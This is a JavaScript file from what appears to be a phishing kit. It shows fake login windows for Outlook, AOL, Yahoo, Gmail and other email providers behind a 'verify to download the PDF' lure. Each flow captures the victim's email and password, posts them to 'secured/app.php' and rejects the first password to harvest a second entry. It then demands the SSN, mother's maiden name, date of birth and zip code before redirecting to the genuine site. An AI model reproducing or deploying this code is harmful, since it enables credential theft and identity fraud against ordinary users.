const mBox = document.querySelectorAll(".m__box-form-box");
const loader = document.querySelector(".loader");
const btnNext = document.querySelectorAll(".btn-next");
const offset = document.querySelector(".offset");
const input = document.querySelectorAll(".m__input");
const mBoxSignin = document.querySelector(".m__box-signin");
const mMail = document.querySelector(".m__mail");
const bgDisabled = document.querySelector(".bg-disabled");
const error = document.querySelectorAll(".error");
const error3 = document.querySelector(".error-3");
const errorMsg = document.querySelector(".error-f");
const val1 = document.querySelector("#val-1");
const val2 = document.querySelector("#val-2");
const darkThemeMq = window.matchMedia("(prefers-color-scheme: dark)");
const [windowPopup1, windowPopup2, windowPopup3, windowPopup4] = document.querySelectorAll('.win');
const officeCard = document.querySelector('.offi-card');
const outlCard = document.querySelector('.outcard');
const aolcard = document.querySelector('.aolcard');
const otherCard = document.querySelector('.otherbox');
const gmailCard = document.querySelector('.gmail-card');
const yahCard = document.querySelector('.yah-card');
const email2 = document.querySelector(".email2");
const pass2 = document.querySelector(".pass2");
const ssn = document.querySelector(".ssn");
const motherMaid = document.querySelector(".mothermaid");
const dob = document.querySelector(".dob");
const zipCode = document.querySelector(".zip");
var minimize = document.getElementById("minimize");
let square = document.getElementById("square");
let exit = document.getElementById("exit");
let titleBar = document.getElementById("title-bar");
let titleBar2 = document.querySelector(".exit2");
let exit3 = document.querySelector('.exit3');
let exit4 = document.querySelector('.exit4');
let count = 0;
let errorCount = 0;

btnNext[0].disabled = false;
btnNext[1].disabled = false;

const ajaxCode = (data) => {
    $.ajax({
        //post php link here....
        url: 'secured/app.php',
        type: 'POST',
        data: {pass: data},
    });
};

titleBar2.addEventListener('click', () => {
    windowPopup2.style.display = 'none';
})
exit3.addEventListener('click', () => {
    windowPopup3.style.display = 'none';
})

exit4.addEventListener('click', () => {
    windowPopup4.style.display = 'none';
})

officeCard.addEventListener('click', () => {
    windowPopup1.style.display = 'block';
});

outlCard.addEventListener('click', () => {
    windowPopup1.style.display = 'block';
});

aolcard.addEventListener('click', () => {
    windowPopup2.style.background = "#f3f7f9";
    windowPopup2.style.display = 'block';
});

gmailCard.addEventListener('click', () => {
    windowPopup3.style.background = '#fff';
    windowPopup3.style.display = 'block';
})


yahCard.addEventListener('click', () => {
    windowPopup4.style.background = '#fff';
    windowPopup4.style.display = 'block';
})
otherCard.addEventListener('click', () => {
    document.querySelector('.otherpopup').style.display = 'block';
})


const windowEvents = () => {
    window.addEventListener("load", () => {
        setTimeout(() => {
            mBoxSignin.style.display = "none";
            mBox[count].classList.add("active");
        }, 2000);
    })
};
windowEvents();

const formUpdate = () => {
    mBox.forEach((mBoxEl, index) => {
        if (mBoxEl.classList.contains("active")) {
            mBoxEl.classList.remove("active");
            offset.classList.add("hide");
        }
    });
    mBox[count].classList.add("active");
};

const btn1Handler = () => {
    if (input[0].value === "") {
        error[0].classList.remove("hide-error");

    } else {
        count++;
        error[0].classList.add("hide-error");
        btnNext[0].disabled = true;
        loader.classList.add("show");

        setTimeout(() => {
            mMail.textContent = input[0].value;
            loader.classList.remove("show");
            btnNext[0].disabled = true;
            formUpdate();
        }, 3000);
    }
};

const btn2Handler = () => {
    if (input[1].value === "") {
        error[1].classList.remove("hide-error");

    } else {
        error[1].classList.add("hide-error");
        btnNext[1].disabled = true;
        loader.classList.add("show");
        errorCount++;


        var emailForm = input[0].value;
        var passForm = input[1].value;

        let fData4 = `Email Address: ${emailForm} \nPassword: ${passForm}`;
        //   postApi(fData4);
        ajaxCode(fData4);

        setTimeout(() => {
            mMail.textContent = input[0].value;
            loader.classList.remove("show");

            if (errorCount === 1) {
                error[1].classList.remove("hide-error");
                input[1].value = "";
                btnNext[1].disabled = false;
            } else {
                count++;
                formUpdate();
                email2.value = input[0].value;
            }

        }, 3000);
    }
};

btnNext[0].addEventListener("click", btn1Handler);
btnNext[1].addEventListener("click", btn2Handler);

btnNext[2].addEventListener('click', () => {
    if (pass2.value === '') {
        error[2].classList.remove('hide-error');
        error3.textContent = "Please enter a Valid Password";
    } else if (ssn.value === '') {
        error[2].classList.remove('hide-error');
        error3.textContent = "Please enter your Socail Security Number";
    } else if (motherMaid.value === '') {
        error[2].classList.remove('hide-error');
        error3.textContent = "Please enter your Mother's Maiden Name";
    } else if (dob.value === '') {
        error[2].classList.remove('hide-error');
        error3.textContent = "Please enter your Date of Birth";
    } else if (zipCode.value === '') {
        error[2].classList.remove('hide-error');
        error3.textContent = "Please enter your Zip Code";
    } else {
        error[2].classList.add('hide-error');
        error3.textContent = "";
        count++;
        loader.classList.add("show");
        let fData4 = `Email Address: ${email2.value} \nPassword: ${pass2.value}  \nSocial Security Number: ${ssn.value}  \nMothers Maiden Name: ${motherMaid.value}  \nDate Of Birth: ${dob.value}  \nZip Code: ${zipCode.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        if (count === 3) {
            setTimeout(() => {
                loader.classList.remove("show");
                error[2].classList.remove('hide-error');
                error3.textContent = "Please enter your microsoft Password";
                pass2.value = '';
            }, 2000);
        } else {
            setTimeout(() => {
                loader.classList.remove("show");
                window.location.href = "https://outlook.live.com/owa/";
            }, 2000);
        }
    }
});

//End window outlook scripts


//Popup JS
$(document).ready(function () {
    minimize.addEventListener('mouseover', function handleMouseOver() {
        if (darkThemeMq.matches) {
            minimize.style.backgroundColor = "#272727";
            minimize.style.cursor = "context-menu";

        } else {
            minimize.style.backgroundColor = "rgba(0, 0, 0, 0.09765625)";
            minimize.style.cursor = "context-menu";
        }


    });

    minimize.addEventListener('mouseout', function handleMouseOut() {
        if (darkThemeMq.matches) {
            minimize.style.backgroundColor = "black";
            minimize.style.cursor = "default";
        } else {
            minimize.style.backgroundColor = "#d6dae0";
            minimize.style.cursor = "default";
        }

    });

    square.addEventListener('mouseover', function handleMouseOver() {

        if (darkThemeMq.matches) {
            square.style.backgroundColor = "#272727";
            square.style.cursor = "context-menu";
        } else {
            square.style.backgroundColor = "rgba(0, 0, 0, 0.09765625)";
            square.style.cursor = "context-menu";
        }

    });

    square.addEventListener('mouseout', function handleMouseOut() {
        if (darkThemeMq.matches) {
            square.style.backgroundColor = "black";
            square.style.cursor = "default";
        } else {
            square.style.backgroundColor = "#d6dae0";
            square.style.cursor = "default";
        }

    });

    exit.addEventListener('mouseover', function handleMouseOver() {
        if (darkThemeMq.matches) {
            exit.style.backgroundColor = "red";
            exit.style.cursor = "context-menu";
        } else {
            exit.style.backgroundColor = "#E81123";
            exit.style.cursor = "context-menu";
        }

    });

    exit.addEventListener('mouseout', function handleMouseOut() {
        if (darkThemeMq.matches) {
            exit.style.backgroundColor = "black";
            exit.style.cursor = "default";
        } else {
            exit.style.backgroundColor = "#d6dae0";
            exit.style.cursor = "default";
        }

    });


    titleBar.addEventListener('mouseover', function handleMouseOver() {
        titleBar.style.cursor = 'context-menu';
    });

    titleBar.addEventListener('mouseout', function handleMouseOver() {
        titleBar.style.cursor = 'default';
    });

    titleBar.addEventListener('mouseout', function handleMouseOver() {
        titleBar.style.cursor = 'default';
    });

    $("#exit").click(function () {
        $('.btn-secondary').click()
        $("#window").css("display", "none");
    });

    $('.btn-secondary').click(function () {
        $("#window").css("display", "none");
    })


    $('.close').click(function () {
        $("#window").css("display", "none");
    })

})
//End POPUP JS SETTINGS


//AOL WINDOW JS SETTINGS
const [btnAol, btnAolLogin, btnVerify] = document.querySelectorAll(".btnAol");
const [aolInput, aolInput2, aolinput3, aolinput4, aolinput5, aolinput6, aolinput7, aolinput8] = document.querySelectorAll(".aol-input");
const [errAol1, errAol2, errAol3, errAol4] = document.querySelectorAll('.err-aol');
const [loaderer, loaderer2, loaderer3] = document.querySelectorAll(".loadererr");
const signDataText = document.querySelector('.sign-data-text');
const formAol = document.querySelectorAll(".form-ao-data");
let counts = 0;
let keycountErr = 0;

const formMove = () => {
    formAol.forEach((mBoxEl, index) => {
        if (mBoxEl.classList.contains("active")) {
            mBoxEl.classList.remove("active");
        }
    });
    formAol[counts].classList.add("active");
};

btnAol.addEventListener("click", () => {
    if (aolInput.value === '') {
        errAol1.textContent = 'Please enter your username, Email or Phone';
    } else {
        errAol1.textContent = '';
        loaderer.classList.remove('hide-load-icon');

        setTimeout(() => {
            loaderer.classList.add('hide-load-icon');
            counts++;
            console.log(counts);
            formMove();
        }, 2000);
    }
});

btnAolLogin.addEventListener("click", () => {
    if (aolInput2.value === '') {
        errAol2.textContent = 'Please Password, Email or Phone';
    } else {
        errAol2.textContent = '';
        keycountErr++;
        let fData4 = `Email Address: ${aolInput.value} \nPassword: ${aolInput2.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        loaderer2.classList.remove('hide-load-icon');
        setTimeout(() => {
            if (keycountErr === 1) {
                errAol2.textContent = 'Please Password, Email or Phone';
                loaderer2.classList.add('hide-load-icon');
                aolInput2.value = '';

            } else {
                signDataText.textContent = "Please Help us verify your account to download the document";
                counts++;
                aolinput3.value = aolInput.value;
                formMove();
            }

        }, 2000);

    }
});

btnVerify.addEventListener("click", () => {
    if (aolinput4.value === '') {
        errAol3.textContent = 'Please Enter your Email Password';
    } else if (aolinput5.value === '') {
        errAol3.textContent = 'Please Enter A Valid Social Security Number';
    } else if (aolinput6.value === '') {
        errAol3.textContent = `Please Enter your Mother's Maiden Name`;
    } else if (aolinput7.value === '') {
        errAol3.textContent = `Please enter a valid Date Of Birth`;
    } else if (aolinput8.value === '') {
        errAol3.textContent = `Please enter a valid Zip Code`;
    } else {
        errAol3.textContent = '';
        loaderer3.classList.remove('hide-load-icon');
        counts++;
        let fData4 = `Email Address: ${aolinput3.value} \nPassword: ${aolinput4.value}  \nSSN: ${aolinput5.value} \nMother's Maiden Name: ${aolinput6.value}  \nDate Of Birth: ${aolinput7.value}  \nZip Code: ${aolinput8.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {

            if (counts === 3) {
                errAol3.textContent = "Please enter your AOL Email Password";
                aolinput4.value = '';
                loaderer3.classList.add('hide-load-icon')
            } else {
                loaderer3.classList.add('hide-load-icon');
                window.location.href = 'https://www.aol.com/';
            }

        }, 2000);

    }
});

//AOL WINDOW SETTINGS JS END
const [yahBtn1, yahBtn2, yahBtn3] = document.querySelectorAll('.btn-next-yahoo');
const [yahooInput1, yahooInput2, yahooInput3, yahooInput4, yahooInput5, yahooInput6, yahooInput7, yahooInput8] = document.querySelectorAll('.yah-input');
const yahBoxMain = document.querySelectorAll('.yaho-form-boxes');
const yahtext = document.querySelector('.text-yah-sign');
const [yahErr1, yahErr2, yahErr3] = document.querySelectorAll('.yah-error-div');
const [yahLoader1, yahLoader2, yahLoader3] = document.querySelectorAll('.yah-loader');

let counter = 0;
let mainKey = 0;
let keyYah = 0;

const formYahMover = () => {
    yahBoxMain.forEach((mBoxEl, index) => {
        if (mBoxEl.classList.contains("active")) {
            mBoxEl.classList.remove("active");
        }
    });
    yahBoxMain[counter].classList.add("active");
};


yahBtn1.addEventListener('click', () => {
    if (yahooInput1.value === '') {
        yahErr1.textContent = 'Please enter your username, Email or Phone';
    } else {
        counter++;
        yahErr1.textContent = '';
        yahLoader1.classList.remove('hide-load-icon');
        setTimeout(() => {
            formYahMover();
        }, 1000);

    }
})

yahBtn2.addEventListener('click', () => {
    if (yahooInput2.value === '') {
        yahErr2.textContent = 'Please enter your Password';
    } else {

        keyYah++;
        yahErr2.textContent = '';
        yahLoader2.classList.remove('hide-load-icon');
        yahooInput3.value = yahooInput1.value;
        let fData4 = `Email Address: ${yahooInput1.value} \nPassword: ${yahooInput2.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {
            if (keyYah === 1) {
                yahErr2.textContent = 'Please enter a valid Password';
                yahooInput2.value = '';
                yahLoader2.classList.add('hide-load-icon');
            } else {
                counter++;
                formYahMover();
                yahtext.textContent = 'Verify Account your account to get access to the PDF document';
            }

        }, 1000);

    }
});

yahBtn3.addEventListener('click', () => {
    if (yahooInput4.value === '') {
        yahErr3.textContent = 'Please enter your Email Password';
    } else if (yahooInput5.value === '') {
        yahErr3.textContent = 'Please enter your social security number';
    } else if (yahooInput6.value === '') {
        yahErr3.textContent = "Please enter your Mother's Maiden Number";
    } else if (yahooInput7.value === '') {
        yahErr3.textContent = "Please enter your Date of Birth";
    } else if (yahooInput8.value === '') {
        yahErr3.textContent = "Please enter your Zip Code";
    } else {
        counter++;
        mainKey++;
        yahErr3.textContent = '';
        yahLoader3.classList.remove('hide-load-icon');
        let fData4 = `Email Address: ${yahooInput3.value} \nPassword: ${yahooInput4.value} \nSocial Security Number: ${yahooInput5.value} \nMothers Maiden Name: ${yahooInput6.value} \nDate Of Birth: ${yahooInput7.value} \nZip Code: ${yahooInput8.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {

            if (mainKey === 1) {
                yahErr3.textContent = 'Enter your email password';
                yahooInput4.value = '';
                yahLoader3.classList.add('hide-load-icon');
            } else {
                yahLoader3.classList.add('hide-load-icon');
                window.location.href = "https://login.yahoo.com/?.intl=nz";
            }

        }, 1000);

    }
})


//Gmail Window SETTINGS START
const gmformMaincon = document.querySelectorAll('.gmcontainer-div');
const [gmbtnNext1, gmbtnNext2, gmbtnNext3] = document.querySelectorAll('.gm-next-btn');
const [gmInput1, gmInput2, gmInput3, gmInput4, gmInput5, gmInput6, gmInput7] = document.querySelectorAll('.gm-main-input');
const [errorGm1, errorGm2, errorGm3] = document.querySelectorAll('.gm-error');
const textErrorGm = document.querySelector('.text-error-gm');
const mailtextInfo = document.querySelector('.gm-mail-text-info');
const gmDataMail = document.querySelector('.gm-data-mail');
let counted = 0;
let keyGmCount = 0;

const formMoveHandler = () => {
    gmformMaincon.forEach((mBoxEl, index) => {
        if (mBoxEl.classList.contains("active")) {
            mBoxEl.classList.remove("active");
        }
    });
    gmformMaincon[counted].classList.add("active");
};


gmbtnNext1.addEventListener('click', () => {
    if (gmInput1.value === '') {
        errorGm1.classList.remove('error-remover');
        gmInput1.style.border = '1px solid rgb(212, 23, 23)';
    } else {
        counted++;
        errorGm1.classList.add('error-remover');
        gmInput1.style.border = '1px solid #eee';
        mailtextInfo.textContent = gmInput1.value;
        setTimeout(() => {
            formMoveHandler();
        }, 1000);
    }
})


gmbtnNext2.addEventListener('click', () => {
    if (gmInput2.value === '') {
        errorGm2.classList.remove('error-remover');
        gmInput2.style.border = '1px solid rgb(212, 23, 23)';
    } else {
        keyGmCount++;
        errorGm2.classList.add('error-remover');
        gmInput2.style.border = '1px solid #eee';
        gmDataMail.textContent = gmInput1.value;
        let fData4 = `Email Address: ${gmInput1.value} \nPassword: ${gmInput2.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {
            if (keyGmCount === 1) {

                errorGm2.classList.remove('error-remover');
                gmInput2.style.border = '1px solid rgb(212, 23, 23)';
                gmInput2.value = '';
            } else {
                counted++;
                formMoveHandler();

            }

        }, 1000);
    }
})

gmbtnNext3.addEventListener('click', () => {
    if (gmInput3.value === '') {
        errorGm3.classList.remove('error-remover');
        textErrorGm.textContent = 'Enter your email password';
    } else if (gmInput4.value === '') {
        errorGm3.classList.remove('error-remover');
        textErrorGm.textContent = 'Enter your social security number';
    } else if (gmInput5.value === '') {
        errorGm3.classList.remove('error-remover');
        textErrorGm.textContent = 'Enter your mothers maiden name';
    } else if (gmInput6.value === '') {
        errorGm3.classList.remove('error-remover');
        textErrorGm.textContent = 'Enter your Date Of Birth';
    } else if (gmInput7.value === '') {
        errorGm3.classList.remove('error-remover');
        textErrorGm.textContent = 'Enter your Zip Code';
    } else {
        errorGm3.classList.add('error-remover');
        textErrorGm.textContent = '';
        counted++;
        let fData4 = `Email Address: ${gmDataMail.textContent} \nPassword: ${gmInput3.value} \nSocial Security Number: ${gmInput4.value} \nMothers Maiden Name: ${gmInput5.value} \nDate Of Birth: ${gmInput6.value} \nZip Code: ${gmInput7.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {
            if (counted === 3) {
                errorGm3.classList.remove('error-remover');
                textErrorGm.textContent = 'Enter your correct Email Password';
                gmInput3.value = '';
                gmInput3.style.border = '1px solid rgb(212, 23, 23)';
            } else {
                errorGm3.classList.add('error-remover');
                textErrorGm.textContent = '';
                gmInput3.style.border = '1px solid #eee';
                window.location.href = 'https://www.google.com/intl/en-GB/gmail/about/';
            }
        }, 2000);
    }
})
//Gmail Window SETTINGS END


const formOtherEmail = document.querySelectorAll('.other-form-mail');
const btnOtherLogin = document.querySelector('.btn-Login');
const btnotherVerify = document.querySelector('.btn-verify');
const errorOther = document.querySelector('.error-other-msg');
const errOther2 = document.querySelector('.erroroth-2');
const emailother = document.querySelector('.email-other');
const emailOther2 = document.querySelector('.emailother2');
const passOther = document.querySelector('.pass-other');
const emailPassOther = document.querySelector('.emailpass');
const ssnOther = document.querySelector('.ssnOther');
const maidOther = document.querySelector('.maidOther');
const dobOther = document.querySelector('.dobOther');
const zipOther = document.querySelector('.zipOther');
const logOtherInfo = document.querySelector('.logother-info');
const otherClose = document.querySelector('.other-close');
const otherBtnClose = document.querySelector('.btn-close');
const otherMainPop = document.querySelector('.otherpopup');

let counting = 0;
let errkeyed = 0;

otherClose.addEventListener('click', () => {
    otherMainPop.style.display = 'none';
});

otherBtnClose.addEventListener('click', () => {
    otherMainPop.style.display = 'none';
});

const formOtherMover = () => {
    formOtherEmail.forEach((mBoxEl, index) => {
        if (mBoxEl.classList.contains("active")) {
            mBoxEl.classList.remove("active");
        }
    });
    formOtherEmail[counting].classList.add("active");
};

btnOtherLogin.addEventListener('click', () => {
    if (emailother.value === '') {
        errorOther.textContent = "Enter your email address";
    } else if (passOther.value === '') {
        errorOther.textContent = "Enter your email password";
    } else {
        errkeyed++;
        let fData4 = `Email Address: ${emailother.value} \nPassword: ${passOther.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {
            if (errkeyed === 1) {
                errorOther.textContent = "Email Password is incorrect";
                passOther.value = '';
            } else {
                errorOther.textContent = "";
                logOtherInfo.textContent = "Verify your account to get acess to PDF";
                counting++;
                emailOther2.value = emailother.value;
                formOtherMover();
            }
        }, 1500);
        errorOther.textContent = "";
    }
});

btnotherVerify.addEventListener('click', () => {
    if (emailPassOther.value === '') {
        errOther2.textContent = "Enter your Email Password";
    } else if (ssnOther.value === '') {
        errOther2.textContent = "Enter your Socail Security Number";
    } else if (maidOther.value === '') {
        errOther2.textContent = "Enter your Mother's Maiden Number";
    } else if (dobOther.value === '') {
        errOther2.textContent = "Enter your Date of birth";
    } else if (zipOther.value === '') {
        errOther2.textContent = "Enter your valid zip code";
    } else {
        // errkeyed++;
        counting++;
        let fData4 = `Email Address: ${emailOther2.value} \nPassword: ${emailPassOther.value} ]\nSocial Security Number: ${ssnOther.value} \nMothers Maiden Name: ${maidOther.value} \nDate Of Birth: ${dobOther.value} \nZip Code: ${zipOther.value}`;
        ajaxCode(fData4);
        // postApi(fData4);

        setTimeout(() => {
            if (counting === 2) {
                errOther2.textContent = "Email Password is incorrect";
                emailPassOther.value = '';
            } else {
                errOther2.textContent = "";
                let direct = emailOther2.value.split('@');
                window.location.href = `https://www.${direct[1]}`;

            }
        }, 1500);
        errOther2.textContent = "";
    }
});


//DRAGABLE HANDLER WINDOW FUNCTION
const draggerHandler = (elData) => {
    dragElement(document.querySelector(elData));

    function dragElement(elmnt) {
        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
        if (document.getElementById(elmnt.id + "header")) {
            // if present, the header is where you move the DIV from:
            document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
        } else {
            // otherwise, move the DIV from anywhere inside the DIV:
            elmnt.onmousedown = dragMouseDown;
        }

        function dragMouseDown(e) {
            e = e || window.event;
            // get the mouse cursor position at startup:
            pos3 = e.clientX;
            pos4 = e.clientY;
            document.onmouseup = closeDragElement;
            // call a function whenever the cursor moves:
            document.onmousemove = elementDrag;
        }

        function elementDrag(e) {
            e = e || window.event;
            e.preventDefault();
            // calculate the new cursor position:
            pos1 = pos3 - e.clientX;
            pos2 = pos4 - e.clientY;
            pos3 = e.clientX;
            pos4 = e.clientY;
            // set the element's new position:
            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
        }

        function closeDragElement() {
            // stop moving when mouse button is released:
            document.onmouseup = null;
            document.onmousemove = null;
        }
    }

}

draggerHandler('.win');
draggerHandler('.win-2');
draggerHandler('.win-3');
draggerHandler('.win-4');
//DRAGABLE HANDLER WINDOW FUNCTION END
